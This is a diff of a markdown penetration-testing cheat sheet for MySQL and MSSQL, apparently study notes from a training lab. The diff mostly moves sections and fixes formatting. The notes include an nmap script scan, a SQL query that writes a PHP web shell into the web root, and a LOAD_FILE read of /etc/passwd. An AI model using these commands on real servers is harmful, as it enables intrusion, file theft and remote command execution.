@@ -1,3 +1,7 @@
+---
+layout: default
+---
+
 # MySQL
 ## Interaction
 ```bash
@@ -21,7 +25,7 @@ $ sudo nmap <IP> -sV -sC -p3306 --script mysql*
 ```
 
 ## Write Local File
-```
+```sql
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 
 Query OK, 1 row affected (0.001 sec)
@@ -37,6 +41,11 @@ secure_file_priv may be set as follows:
 
 In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:
 
+## Read Local Files
+```sql
+mysql> select LOAD_FILE("/etc/passwd");
+```
+
 ## Secure File Privileges
 ```
 mysql> show variables like "secure_file_priv";
@@ -51,10 +60,7 @@ mysql> show variables like "secure_file_priv";
 ```
 
 
-## MySQL - Read Local Files in MySQL
-```
-mysql> select LOAD_FILE("/etc/passwd");
-```
+
 
 
 
@@ -76,7 +82,7 @@ $ sqsh -S <IP> -U julio -P 'MyPassword!' -h
 | SELECT name FROM master.dbo.sysdatabases;                 | Show all databases.                                   |
 | USE htbusers                                              | Select one of the existing databases.                 |
 | SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;   | Show all available tables in the selected database.   |
-SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+| SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES |
 | SELECT * FROM Employees.dbo.employee_information;         | Show everything in the desired table.                 |
 
 ## Footprinting 
